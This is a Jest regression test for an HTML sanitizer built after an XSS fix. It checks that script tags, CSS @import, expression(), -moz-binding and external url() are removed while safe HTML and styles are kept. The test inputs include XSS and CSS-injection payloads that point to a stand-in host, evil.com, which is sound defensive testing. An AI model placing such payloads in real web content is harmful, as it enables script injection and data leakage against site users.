/**
 * Regression test for sanitizePublicHtml — #1840 XSS fix.
 *
 * Verifies that:
 * 1. allowVulnerableTags is NOT used (no raw <style>/<script> passthrough)
 * 2. CSS from <style> tags is extracted, sanitized, and re-injected
 * 3. Dangerous CSS constructs (url(), @import, expression()) are stripped
 * 4. Normal HTML and inline styles still work
 * 5. <script> tags are blocked (consent-gated)
 */

jest.mock('pg', () => ({
    Pool: jest.fn().mockImplementation(() => ({
        query: jest.fn().mockResolvedValue({ rows: [], rowCount: 0 }),
        connect: jest.fn().mockResolvedValue({
            query: jest.fn().mockResolvedValue({ rows: [] }),
            release: jest.fn(),
        }),
        end: jest.fn().mockResolvedValue(undefined),
    })),
}));

const app = require('../../index');
const sanitize = app._sanitizePublicHtml;

describe('sanitizePublicHtml (XSS regression #1840)', () => {
    test('strips <script> tags from output (consent-gated)', () => {
        const html = '<p>Hello</p><script>alert("xss")</script>';
        const result = sanitize(html);
        expect(result).not.toContain('<script>');
        // Script should be preserved as blocked data for consent
        expect(result).toContain('eclaw-blocked-scripts');
    });

    test('preserves safe HTML tags', () => {
        const html = '<h1>Title</h1><p>Text</p><ul><li>Item</li></ul>';
        const result = sanitize(html);
        expect(result).toContain('<h1>');
        expect(result).toContain('<p>');
        expect(result).toContain('<li>');
    });

    test('preserves inline style attributes', () => {
        const html = '<p style="color: red; font-size: 14px;">Styled</p>';
        const result = sanitize(html);
        expect(result).toContain('color');
    });

    test('extracts <style> blocks and re-injects sanitized CSS', () => {
        const html = '<style>.foo { color: blue; }</style><p class="foo">Blue text</p>';
        const result = sanitize(html);
        expect(result).toContain('<style>');
        expect(result).toContain('color: blue');
        expect(result).toContain('<p');
    });

    test('strips @import from <style> blocks', () => {
        const html = '<style>@import url("https://evil.com/steal.css"); .ok { color: red; }</style><p>Text</p>';
        const result = sanitize(html);
        expect(result).toContain('/* @import removed */');
        expect(result).not.toContain('evil.com');
        expect(result).toContain('color: red');
    });

    test('strips expression() from <style> blocks', () => {
        const html = '<style>.x { width: expression(document.body.clientWidth); }</style><p>T</p>';
        const result = sanitize(html);
        expect(result).not.toContain('expression(');
        expect(result).toContain('/* expression removed */');
    });

    test('strips url() with non-data-image sources', () => {
        const html = '<style>.bg { background: url("https://tracker.com/pixel.gif"); }</style><p>T</p>';
        const result = sanitize(html);
        expect(result).not.toContain('tracker.com');
        expect(result).toContain('/* url() removed */');
    });

    test('preserves url() with data:image sources', () => {
        const html = '<style>.bg { background: url(data:image/png;base64,abc123); }</style><p>T</p>';
        const result = sanitize(html);
        expect(result).toContain('data:image/png');
    });

    test('strips -moz-binding from <style> blocks', () => {
        const html = '<style>.x { -moz-binding: url("https://evil.com/xbl"); }</style><p>T</p>';
        const result = sanitize(html);
        expect(result).not.toContain('-moz-binding:');
        expect(result).not.toContain('evil.com');
    });

    test('returns empty string for null/empty input', () => {
        expect(sanitize(null)).toBe('');
        expect(sanitize('')).toBe('');
        expect(sanitize(undefined)).toBe('');
    });

    test('strips <style> tag from allowedTags (no allowVulnerableTags)', () => {
        // Without the fix, <style> would pass through directly
        // With the fix, <style> is extracted, sanitized, and re-injected separately
        const html = '<style>body { background: red; }</style><p>Safe</p>';
        const result = sanitize(html);
        // The output should still contain <style> (re-injected), but the content is sanitized
        expect(result).toContain('<style>');
        expect(result).toContain('background: red');
    });

    test('multiple <style> blocks are all sanitized', () => {
        const html = '<style>.a { color: red; }</style><p>Hi</p><style>.b { font-size: 12px; } @import "evil";</style>';
        const result = sanitize(html);
        expect(result).toContain('color: red');
        expect(result).toContain('font-size: 12px');
        expect(result).toContain('/* @import removed */');
        expect(result).not.toContain('"evil"');
    });
});
